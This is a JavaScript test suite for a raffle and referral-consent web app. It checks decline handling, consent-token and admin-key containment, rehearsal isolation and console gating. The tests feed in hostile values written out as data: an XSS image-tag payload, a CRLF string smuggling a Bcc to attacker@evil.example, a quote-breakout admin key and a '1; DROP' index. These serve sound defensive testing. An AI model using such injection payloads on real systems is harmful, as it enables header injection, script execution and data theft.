  // -- an expired/unknown token must not reveal anything, and declining must be
  //    recorded rather than silently dropped.
  const s = makeSandbox();
  const page = String(at(DURING, () => s.raffleConsentPage_(
    { parameter: { t: '11111111-1111-4111-8111-111111111111' } })));
  check('an unknown token renders a neutral expired page', /expired/i.test(page));
  check('and names nobody', !/@mail-test\.co/.test(page));

  const a = stage(s, {}, {}, DURING);
  const declined = J(at(DURING, () => s.raffleHandleSubmission_(
    { step: 'consent', decision: 'decline', token: a.staged.token })));
  check('a decline is accepted', !!(declined && declined.declined));
  // Scoped to referral rows: the entrant's own row is eligible the moment they
  // verify, and a decline is not supposed to take that away from them.
  check('a declined referral row is not eligible',
    refRows(s, 'Entries').filter(r => String(r[11]) === 'eligible').length === 0,
    JSON.stringify(refRows(s, 'Entries').map(r => String(r[11]))));
  check('and the decline does not revoke the entrant\'s own entry',
    selfRows(s, 'Entries').filter(r => String(r[11]) === 'eligible').length === 1);
  // A decline now CREATES a suppression record, because there is no longer a
  // contact sitting there to mark: referrals only reach FUB when they consent.
  const declineWrite = s.__fetches.filter(f => /\/v1\/people/.test(f.url) && f.o &&
    /Do Not Contact/.test(String(f.o.payload || ''))).pop();
  check('the decline is written to FUB as do-not-contact',
    !!declineWrite, 'no FUB write carried a Do Not Contact tag');
  check('and the record says plainly not to work it',
    !!declineWrite && /DO NOT CONTACT/.test(String(declineWrite.o.payload)));

  // And they cannot simply be referred again by the next person who thinks of them.
  const again = stage(s, { fullName: 'Another Entrant', email: 'another@mail-test.co',
                           phone: '(267) 555-8330' }, {}, DURING);
  check('a person who declined cannot be referred again',
    !(again.staged && again.staged.staged), JSON.stringify(again.staged));
}

// ---------------------------------------------------------------------------
section('T12  EVERY email, not just the pages');
// ---------------------------------------------------------------------------
// The escaping tests grew up around the PAGES, because that is where the first
// stored-XSS finding was. The emails were covered by exactly two assertions: the
// invite body, and CR/LF in the draw subject. Meanwhile the system now sends
// nine different emails, six of which interpolate a name somebody typed into a
// public text box, and every one of them lands in a third party's inbox.
//
// So this does not test emails one at a time. It drives ONE hostile journey that
// provokes every email the system can send, then applies the same invariants to
// every captured message -- which means an email added later is covered the day
// it is added, without anybody remembering to come back here.
{
  const XSS = '<img src=x onerror=alert(1)>';
  const CRLF = '\r\nBcc: attacker@evil.example\r\n';
  const hostile = n => XSS + ' Hostile' + CRLF + n + ' Person';

  const s = makeSandbox({ props: { RAFFLE_SHEET_ID: 'sheet1', FUB_API_KEY: 'key',
                                   RAFFLE_ADMIN_KEY: 'secret' } });

  // 1. code email, 2. invite, 3. entrant "5 more entries", 4. chain invite
  const v = verifySession(s, entry({ fullName: hostile('Aaa'),
    email: 'hostile-a@mail-test.co', phone: '(215) 555-8901' }), DURING);
  check('a hostile name is accepted as text (setup)', !!(v && v.verified), JSON.stringify(v));
  const staged = J(at(DURING, () => s.raffleHandleSubmission_(Object.assign(
    { step: 'referral', vid: v.vid },
    referral({ referralName: hostile('Bbb'), referralEmail: 'hostile-b@mail-test.co',
               referralPhone: '(215) 555-9901' })))));
  check('a hostile referral is staged (setup)', !!staged.staged, JSON.stringify(staged));
  at(DURING, () => s.raffleHandleSubmission_({ step: 'invite', vid: v.vid, token: staged.token }));
  at(DURING, () => s.raffleHandleSubmission_({
    step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
    referralName: hostile('Ccc'), referralPhone: '(215) 555-9902',
    referralRole: 'Buyer', referralTimeframe: '7-12 Months' }));

  // 5. last-chance reminder, 6. referrer nudge -- needs somebody left waiting
  const v2 = verifySession(s, entry({ fullName: hostile('Ddd'),
    email: 'hostile-d@mail-test.co', phone: '(267) 555-8902' }), DURING);
  const st2 = J(at(DURING, () => s.raffleHandleSubmission_(Object.assign(
    { step: 'referral', vid: v2.vid },
    referral({ referralName: hostile('Eee'), referralEmail: 'hostile-e@mail-test.co',
               referralPhone: '(215) 555-9903' })))));
  at(DURING, () => s.raffleHandleSubmission_({ step: 'invite', vid: v2.vid, token: st2.token }));
  at(new Date('2026-09-19T17:00:00-04:00').getTime(),
     () => s.raffleSendConsentReminders_(false));

  // 7. milestone/digest, 8. draw result, 9. winner
  at(new Date('2026-09-19T16:30:00-04:00').getTime(), () => s.raffleEventDigest());
  at(AFTER_CLOSE, () => s.raffleDrawWinner_(false, true));
  at(AFTER_CLOSE, () => s.raffleSendWinnerEmail_(false));

  const mails = s.__sent;
  check('the journey provoked a real spread of emails (guards a vacuous sweep)',
    mails.length >= 7, 'only ' + mails.length + ' email(s) sent');

  // ---- the invariants, applied to every single message --------------------
  const HEADERS_OF = m => ['to', 'cc', 'bcc', 'replyTo', 'subject']
    .map(k => String(m[k] === undefined ? '' : m[k])).join(' | ');

  // WHAT COUNTS AS UNESCAPED, precisely. The first version of this test matched
  // /onerror=alert\(1\)/ and "failed" on three emails whose bodies were in fact
  // perfectly escaped: `&lt;img src=x onerror=alert(1)&gt;` contains that
  // substring and renders as inert text. The executable thing is the unescaped
  // `<`, so that is what to look for -- and the escaped form is counted
  // separately, as proof the value arrived and was handled rather than dropped.
  const RAW_TAG = '<img src=x';
  const ESCAPED_TAG = '&lt;img src=x';
  // Recipients are their own category. A subject or a body may legitimately
  // contain the literal text somebody typed into a name box, however ugly; a
  // RECIPIENT field carrying a line break or an address nobody asked for is a
  // header injection, and that is the finding worth having.
  const RECIPIENTS_OF = m => ['to', 'cc', 'bcc', 'replyTo']
    .map(k => String(m[k] === undefined ? '' : m[k])).join(' | ');

  let rawHtml = [], crlfHdr = [], leaked = [], escaped = 0;
  mails.forEach(function (m, i) {
    const label = '#' + i + ' to ' + String(m.to).slice(0, 40);
    if (String(m.htmlBody || '').indexOf(RAW_TAG) !== -1) rawHtml.push(label);
    if (/[\r\n]/.test(HEADERS_OF(m))) crlfHdr.push(label);
    if (RECIPIENTS_OF(m).indexOf('attacker@evil.example') !== -1) leaked.push(label);
    if (String(m.htmlBody || '').indexOf(ESCAPED_TAG) !== -1) escaped++;
  });

  check('no email body carries an unescaped tag', rawHtml.length === 0,
    rawHtml.join(', '));
  check('no email header or subject carries a line break', crlfHdr.length === 0,
    crlfHdr.join(', '));
  check('no recipient field names the smuggled address', leaked.length === 0,
    leaked.join(', '));
  // THE NON-VACUITY GUARD. Every check above passes trivially if the name never
  // reached any email at all, which is exactly how an escaping test rots. At
  // least some of these emails must show the payload present-and-escaped.
  check('and the payload IS present, escaped, in the emails that carry a name',
    escaped >= 3, 'only ' + escaped + ' email(s) showed an escaped payload');
}

{
  // THE CONSENT LINK IS A BEARER CREDENTIAL, so it must reach exactly one inbox.
  //
  // The invite used to be one message addressed TO the referral and CC the
  // entrant, which handed the token to the only person with a reason to abuse
  // it: confirm on your friend's behalf and collect the bonus without them ever
  // opening anything. Under the old gate rules that was worth one entry; once a
  // confirmed referral became worth RAFFLE_BONUS_TICKETS_PER_REFERRAL it was
  // worth six times as much. And the FUB record it leaves reads "CONSENT GIVEN
  // BY THIS PERSON" for somebody who never saw the page, which is the single
  // claim this design exists to be able to make honestly.
  const s = makeSandbox({ props: { RAFFLE_SHEET_ID: 'sheet1', FUB_API_KEY: 'key' } });
  const ENTRANT = 'greedy@mail-test.co';
  const v = verifySession(s, entry({ fullName: 'Greedy Entrant', email: ENTRANT,
                                     phone: '(215) 555-8920' }), DURING);
  const st = J(at(DURING, () => s.raffleHandleSubmission_(Object.assign(
    { step: 'referral', vid: v.vid },
    referral({ referralName: 'Unwitting Friend', referralEmail: 'unwitting@mail-test.co',
               referralPhone: '(215) 555-9920' })))));
  at(DURING, () => s.raffleHandleSubmission_({ step: 'invite', vid: v.vid, token: st.token }));

  // Everything the entrant can actually see: addressed to them, or cc'd to them.
  const theirs = s.__sent.filter(m =>
    (String(m.to) + ',' + String(m.cc || '')).indexOf(ENTRANT) !== -1);
  check('the entrant does get a copy of what went out (Durand asked for that)',
    theirs.some(m => /here is exactly what went out/.test(String(m.subject))),
    theirs.map(m => m.subject).join(' / '));
  const carries = m => (String(m.htmlBody || '') + String(m.body || ''));
  check('but no message the entrant receives carries the consent token',
    theirs.every(m => carries(m).indexOf(st.token) === -1),
    theirs.filter(m => carries(m).indexOf(st.token) !== -1)
          .map(m => m.subject).join(' / '));
  check('nor any consent link at all',
    theirs.every(m => !/action=consent/.test(carries(m))),
    theirs.filter(m => /action=consent/.test(carries(m))).map(m => m.subject).join(' / '));

  // And the referral's own copy must still carry it, or nobody can ever confirm.
  const refMail = s.__sent.filter(m => String(m.to).indexOf('unwitting@') !== -1);
  check('the referral does receive the link (guards a vacuous test)',
    refMail.length === 1 && carries(refMail[0]).indexOf(st.token) !== -1,
    refMail.length + ' message(s) to the referral');
  check('and the referral is not cc\'d to anybody',
    !refMail[0].cc, JSON.stringify(refMail[0].cc));
}

{
  // THE ADMIN KEY MUST NEVER LEAVE THE TWO OF US. The 6:15 result email embeds a
  // console URL carrying the admin key, because its whole purpose is one tap
  // into the console. That email goes to Durand and Ryan. The WINNER email is
  // built from the same result object and goes to a member of the public -- and
  // the winner is cc'd on nothing that should carry a key. Anyone holding it can
  // send winner emails and force a redraw, so containment is worth asserting on
  // every message rather than trusting the two templates to stay apart.
  const KEY = 'ADMINKEY-do-not-leak-7f3a9c';
  const s = makeSandbox({ props: { RAFFLE_SHEET_ID: 'sheet1', FUB_API_KEY: 'key',
                                   RAFFLE_ADMIN_KEY: KEY } });
  enterFull(s, entry({ fullName: 'Keyleak Entrant', email: 'keyleak@mail-test.co',
                       phone: '(215) 555-8910' }), DURING);
  at(AFTER_CLOSE, () => s.raffleDrawWinner_(false, true));
  at(AFTER_CLOSE, () => s.raffleSendWinnerEmail_(false));

  const INSIDERS = ['durand@thestawaszgroup.com', 'ryan@thestawaszgroup.com', 'ryan@tsg.homes'];
  const carries = m => (String(m.htmlBody || '') + String(m.body || '') +
                        String(m.subject || '')).indexOf(KEY) !== -1;
  const withKey = s.__sent.filter(carries);
  check('the result email does carry the console key (guards a vacuous test)',
    withKey.length >= 1, 'no email carried the key at all, so containment proves nothing');
  // Every message carrying the key must be addressed ONLY to insiders.
  const outsiders = withKey.filter(function (m) {
    const all = ['to', 'cc', 'bcc'].map(k => String(m[k] || '')).join(',')
      .split(',').map(x => x.trim().toLowerCase()).filter(Boolean);
    return all.some(a => INSIDERS.indexOf(a) === -1);
  });
  check('no email carrying the admin key reaches anyone but Durand and Ryan',
    outsiders.length === 0,
    outsiders.map(m => String(m.subject).slice(0, 40) + ' -> ' + m.to + ' / ' + (m.cc || '')).join('; '));

  const winner = s.__sent.filter(m => /You won/i.test(String(m.subject))).pop();
  check('a winner email was produced (setup)', !!winner);
  check('and the winner email carries no admin key at all',
    !!winner && !carries(winner), 'THE WINNER WAS SENT THE ADMIN KEY');
}

// ---------------------------------------------------------------------------
section('T9  Rehearsal bleed: can a TEST run touch a real person?');
// ---------------------------------------------------------------------------
// The project's stated rule is that test mode is "a LABELLING and ROUTING change
// only" and that Ryan is never paged about a rehearsal. The raffle already
// relaxes one check (the entry window) knowingly. What must NEVER happen is a
// rehearsal reaching a real inbox or a real record -- and the surfaces added on
// 2026-09-17 (winner email, console, notifications) are all new places it could.
{
  const s = makeSandbox({ qaMode: true,
    props: { RAFFLE_ADMIN_KEY: 'secret', RAFFLE_SHEET_ID: 'sheet1', FUB_API_KEY: 'key' } });
  ['a', 'b', 'c'].forEach((n, i) => enterFull(s, entry({
    fullName: 'QA Person ' + n, email: 'qa' + n + '@mail-test.co', phone: '(215) 555-870' + i
  }), DURING, {
    referral: { referralName: 'QA Ref ' + n, referralEmail: 'qaref' + n + '@mail-test.co',
                referralPhone: '(215) 555-97' + (10 + i) }
  }));
  // Three journeys, three rows each: the entrant's own entry, the referral, and
  // the referral's own entry from consenting.
  check('test entries went to the test tab', s.__data('Test Entries').length === 9,
    'got ' + s.__data('Test Entries').length);
  eq('six own-entry rows on the test tab', selfRows(s, 'Test Entries').length, 6);
  eq('three referral rows on the test tab', refRows(s, 'Test Entries').length, 3);
  eq('the live tab is untouched', s.__data('Entries').length, 0);

  const drawn = at(DURING, () => s.raffleDrawWinner_(true));
  check('a test draw works (setup)', drawn.ok === true, JSON.stringify(drawn));

  // The result email already collapses to the QA address. The WINNER email is new.
  at(DURING, () => s.raffleSendWinnerEmail_(true));
  const won = s.__sent.filter(m => /You won/i.test(m.subject));
  check('a rehearsal winner email was produced (setup)', won.length === 1);
  check('a rehearsal winner email is labelled as a test',
    !!won.length && /QA TEST/.test(won[0].subject), won.length && won[0].subject);
  // THE ONE THAT MATTERS: the project's rule is that Ryan is not paged about a
  // rehearsal. The result email honours that via qaTestRecipients_; the winner
  // email must too, or a practice run at 4pm on Thursday copies Ryan on a
  // "you won" that nobody won.
  const cc = String((won[0] || {}).cc || '');
  check('a rehearsal winner email does NOT copy Ryan',
    cc.indexOf('ryan@') === -1, 'cc was: ' + cc);

  // A test draw must never write the live winner property.
  check('a test draw leaves the live winner unset', s.__props.RAFFLE_WINNER_JSON === undefined);
  check('and the live winner-emailed marker unset',
    s.__props.RAFFLE_WINNER_EMAILED_AT === undefined);
}

{
  // Milestone notifications must collapse the same way.
  const s = makeSandbox({ qaMode: true });
  for (let i = 0; i < 10; i++) {
    enterFull(s, entry({ fullName: 'QA Milestone ' + i, email: 'qm' + i + '@mail-test.co',
                         phone: '(215) 555-88' + (10 + i) }), BEFORE, {
      referral: { referralName: 'QMRef ' + i, referralEmail: 'qmref' + i + '@mail-test.co',
                  referralPhone: '(215) 555-98' + (10 + i) } });
  }
  const notes = s.__sent.filter(m => /(entries|people) in the Block Party raffle/.test(m.subject));
  // Twenty people (ten entrants and their ten confirmed referrals), so two
  // milestones are crossed. Every one of them must be labelled and collapsed.
  check('rehearsal milestone emails were produced (setup)', notes.length === 2,
    'got ' + notes.length + ' | ' + notes.map(m => m.subject).join(' / '));
  check('every rehearsal milestone email is labelled',
    notes.length > 0 && notes.every(m => /QA TEST/.test(m.subject)),
    notes.map(m => m.subject).join(' / '));
  check('and they go only to the QA address',
    notes.length > 0 && notes.every(m => String(m.to).indexOf('ryan@') === -1),
    notes.map(m => m.to).join(' / '));
}

// ---------------------------------------------------------------------------
section('T10  The console as an attack surface');
// ---------------------------------------------------------------------------
{
  const s = makeSandbox({ props: { RAFFLE_ADMIN_KEY: 'secret', RAFFLE_SHEET_ID: 'sheet1',
                                   FUB_API_KEY: 'key' } });
  ['a', 'b', 'c'].forEach((n, i) => enterFull(s, entry({
    fullName: 'Con ' + n, email: 'con' + n + '@mail-test.co', phone: '(215) 555-890' + i
  }), DURING, {
    referral: { referralName: 'ConRef ' + n, referralEmail: 'conref' + n + '@mail-test.co',
                referralPhone: '(215) 555-99' + (10 + i) }
  }));
  at(AFTER, () => s.raffleDrawWinner_(false));

  // EVERY console action must be gated, not just 'send'. A gate that covers one
  // verb and not the others is the classic way an admin surface leaks.
  ['preview', 'redraw', 'send', 'nonsense'].forEach(verb => {
    const r = J(at(AFTER, () => s.raffleHandleSubmission_({
      step: 'console', consoleAction: verb, key: 'wrong', pick: 0,
      reason: 'a plausible sounding reason here' })));
    check('console action "' + verb + '" is refused with a wrong key', !(r && r.ok),
      JSON.stringify(r));
    check('and the refusal for "' + verb + '" gives nothing away',
      /Not found/.test(String(r && r.error)), String(r && r.error));
  });
  ['preview', 'redraw', 'send'].forEach(verb => {
    const r = J(at(AFTER, () => s.raffleHandleSubmission_({
      step: 'console', consoleAction: verb, pick: 0,
      reason: 'a plausible sounding reason here' })));
    check('console action "' + verb + '" is refused with NO key', !(r && r.ok));
  });
  eq('nothing was emailed to a winner by any of that', 
    s.__sent.filter(m => /You won/i.test(m.subject)).length, 0);
  check('and no redraw happened', !!s.__props.RAFFLE_WINNER_JSON);

  // The pick index is client-supplied. Out-of-range values must clamp, not throw
  // and not read past the end of the list.
  [-5, 99, 2.7, 'x', null, '1; DROP'].forEach((bad, i) => {
    const r = J(at(AFTER, () => s.raffleHandleSubmission_({
      step: 'console', consoleAction: 'preview', key: 'secret', pick: bad })));
    check('a nonsense pick index ' + i + ' is handled, not crashed', !!(r && r.ok),
      JSON.stringify(r));
    check('and resolves to a real pick ' + i, r.pick >= 0 && r.pick <= 2, String(r.pick));
  });

  // The admin key is printed into the console page's JavaScript. It must be
  // encoded, not concatenated -- a key containing a quote would otherwise break
  // out of the string literal and could be made to run.
  const s2 = makeSandbox({ props: { RAFFLE_ADMIN_KEY: 'ab");alert(1);//',
                                    RAFFLE_SHEET_ID: 'sheet1', FUB_API_KEY: 'key' } });
  enterFull(s2, entry(), DURING);
  at(AFTER, () => s2.raffleDrawWinner_(false));
  const page = String(at(AFTER, () => s2.raffleServeForm_(
    { parameter: { action: 'console', key: 'ab");alert(1);//' } }, 'u')));
  // Whitespace-tolerant, and it asserts on what the JS ENGINE would see rather
  // than on an exact source string -- the first version of this check looked for
  // 'var KEY = "' with single spaces while the template aligns them, so it
  // matched nothing and passed vacuously against genuinely broken code.
  const keyLine = (page.match(/var\s+KEY\s*=\s*(.*?);\s*$/m) || [])[1];
  check('the console page has a KEY line at all (guards against a vacuous test)',
    !!keyLine, 'no KEY line found — the page did not render as the console');
  // Assert on what the JS ENGINE would end up with, not on the source text. A
  // substring check is wrong in both directions here: the vulnerable form and the
  // correctly-escaped form BOTH contain the literal characters '");alert(1);//'.
  // The only question that matters is whether the line parses to exactly the key
  // and nothing else follows it.
  let parsed = null, parseErr = null;
  try { parsed = JSON.parse(keyLine); } catch (err) { parseErr = String(err.message); }
  check('the key is a single well-formed JS string literal',
    parsed !== null, 'KEY line did not parse as one literal: ' + keyLine + ' — ' + parseErr);
  check('and it evaluates to exactly the key, with no trailing code',
    parsed === 'ab");alert(1);//', JSON.stringify(parsed));
}

// ---------------------------------------------------------------------------
section('T11  The consent page email is locked');
// ---------------------------------------------------------------------------
// The consent link is a bearer credential sitting in an inbox. While the email
// field was editable, whoever held the link could point it at a third party and
// tick the consent box on their behalf, and the substituted address was never
// re-verified -- a FUB record marked "consented" for somebody who never saw the
// page. As of 2026-09-17 the address is read from the ROW and the field is
// read-only, so the request cannot move it at all.
{
  const s = makeSandbox({ props: { RAFFLE_SHEET_ID: 'sheet1', FUB_API_KEY: 'key' } });
  const v = verifySession(s, entry(), DURING);
  const staged = J(at(DURING, () => s.raffleHandleSubmission_(Object.assign(
    { step: 'referral', vid: v.vid }, referral({})))));
  check('referral staged (setup)', !!staged.staged, JSON.stringify(staged));

  // The consent POST carries a different address. It must be ignored outright.
  const res = J(at(DURING, () => s.raffleHandleSubmission_({
    step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
    referralName: 'Robin Vale', referralEmail: 'attacker@mail-test.co',
    referralPhone: '(215) 555-9001', referralRole: 'Buyer',
    referralTimeframe: '7-12 Months' })));
  check('consent still succeeds', res.ok === true, JSON.stringify(res));

  const row = refRows(s, 'Entries')[0].map(String);
  check('the row keeps the address the referral was SENT to',
    row.indexOf('robin@mail-test.co') !== -1, JSON.stringify(row));
  check('and the substituted address is nowhere on the row',
    row.join('|').indexOf('attacker@mail-test.co') === -1, JSON.stringify(row));

  const writes = JSON.stringify(s.__fetches.map(f => (f.o && f.o.payload) || ''));
  check('and it never reached FUB either',
    writes.indexOf('attacker@mail-test.co') === -1);

  // Everything the person CAN legitimately correct about themselves still works.
  const s2 = makeSandbox({ props: { RAFFLE_SHEET_ID: 'sheet1', FUB_API_KEY: 'key' } });
  const v2 = verifySession(s2, entry(), DURING);
  const st2 = J(at(DURING, () => s2.raffleHandleSubmission_(Object.assign(
    { step: 'referral', vid: v2.vid }, referral({})))));

  // Render the page BEFORE consenting: once the row is eligible the page shows
  // "you are all set" and there is no form to inspect.
  const page = String(at(DURING, () => s2.raffleConsentPage_(
    { parameter: { t: st2.token } })));

  J(at(DURING, () => s2.raffleHandleSubmission_({
    step: 'consent', decision: 'confirm', token: st2.token, consent: 'Yes',
    referralName: 'Robin Vale-Smith', referralPhone: '(267) 555-4321',
    referralRole: 'Seller', referralTimeframe: '0-3 Months' })));
  const row2 = refRows(s2, 'Entries')[0].map(String);
  check('a corrected name is saved', row2.indexOf('Robin Vale-Smith') !== -1, JSON.stringify(row2));
  check('a corrected phone is saved', row2.join('|').indexOf('4321') !== -1, JSON.stringify(row2));
  check('a corrected role is saved', row2.indexOf('Seller') !== -1, JSON.stringify(row2));
  check('a corrected timeframe is saved', row2.indexOf('0-3 Months') !== -1, JSON.stringify(row2));

  // The page must render the field read-only, or the lock is only server-deep and
  // the visitor gets a box that silently discards what they type.
  const emailField = (page.match(/<input id="rEmail"[^>]*>/) || [''])[0];
  check('the consent page renders an email field (guards a vacuous test)',
    emailField.length > 0, 'no email field found');
  check('and it is read-only', /\breadonly\b/.test(emailField), emailField);
  check('the page explains why it cannot be changed',
    /cannot be changed here/.test(page));
  // Name and phone must NOT be locked -- correcting those is the page's purpose.
  const nameField = (page.match(/<input id="rName"[^>]*>/) || [''])[0];
  check('the name field is still editable', !/\breadonly\b/.test(nameField), nameField);
}

console.log('\n' + passes + ' passed, ' + fails + ' failed');
process.exit(fails ? 1 : 0);
